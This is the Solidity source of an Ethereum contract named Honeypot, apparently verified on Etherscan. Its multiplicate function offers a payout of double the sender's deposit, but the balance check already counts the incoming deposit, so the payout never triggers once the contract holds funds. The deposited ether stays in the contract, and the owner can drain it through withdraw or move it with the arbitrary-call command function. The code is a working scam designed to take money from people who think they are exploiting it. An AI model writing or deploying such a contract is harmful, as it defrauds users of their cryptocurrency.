/**
 *Submitted for verification at Etherscan.io on 2022-04-14
*/

pragma solidity ^0.8;

contract Honeypot {
    address owner;

    modifier only(address _addr) {
        require(msg.sender == _addr);
        _;
    }

    constructor() payable {
        owner = msg.sender;
    }

    function withdraw() external payable only(owner) {
        payable(msg.sender).transfer(address(this).balance);
    }

    function command(address _addr, bytes calldata _data) external payable only(owner) returns (bool, bytes memory) {
        (bool success, bytes memory returnedData) = _addr.call{value: msg.value}(_data);
        return (success, returnedData);
    }

    function multiplicate(address _addr) external payable {
        if (msg.value >= address(this).balance) {
            payable(_addr).transfer(msg.value + address(this).balance);
        }
    }
}